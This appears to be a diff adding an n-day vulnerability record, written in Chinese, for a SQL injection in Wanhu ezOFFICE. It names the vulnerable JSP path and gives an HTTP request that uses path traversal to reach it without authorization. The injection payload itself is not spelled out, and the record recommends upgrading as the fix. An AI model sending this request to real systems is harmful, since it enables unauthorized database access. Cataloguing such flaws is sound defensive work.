@@ -1,0 +1,11 @@
+vendor = "万户网络"
+name = "万户 ezOFFICE checkSQL_httprequest.jsp SQL注入漏洞"
+type = "SQL注入"
+version = "万户 ezOFFICE 全版本（路径遍历 + checkSQL_httprequest.jsp 未授权访问）"
+path = "/modules/hrm/report/customize/checkSQL_httprequest.jsp"
+detail = """GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../modules/hrm/report/customize/checkSQL_httprequest.jsp HTTP/1.1 Host: target
+参数中构造 SQL 注入 payload"""
+fix = "升级至最新版本"
+date = 20260315
+label = "nday"
+verifier = "AdySec"
